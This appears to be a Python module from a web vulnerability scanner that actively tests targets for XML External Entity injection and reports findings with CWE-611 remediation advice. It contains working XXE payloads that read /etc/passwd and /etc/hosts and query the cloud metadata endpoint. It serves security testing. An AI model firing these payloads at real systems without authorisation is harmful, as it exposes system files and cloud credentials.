import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hosts">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>',
]


class XxeInjectionCheck(BaseCheck):
    name = "active_xxe_injection"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for payload in XXE_PAYLOADS:
                modified = self._inject_body(base_request, payload)
                try:
                    resp = await client.request(**modified)
                    if "root" in resp.text and ("root:x" in resp.text or "localhost" in resp.text or "latest" in resp.text):
                            results.append(CheckResult(
                                triggered=True,
                                severity="critical",
                                title="XXE injection detected",
                                description="XML External Entity injection successful. Server processed external entity.",
                                evidence=f"Payload: {payload}\nResponse: {resp.text[:500]}",
                                remediation="Disable XML external entity processing. Use JSON or other less complex data formats.",
                                cwe="CWE-611",
                            ))
                except Exception:
                    continue
        return results

    def _inject_body(self, base: dict, payload: str) -> dict:
        import copy
        req = copy.deepcopy(base)
        req["content"] = payload
        req["headers"] = {**req.get("headers", {}), "Content-Type": "application/xml"}
        return req
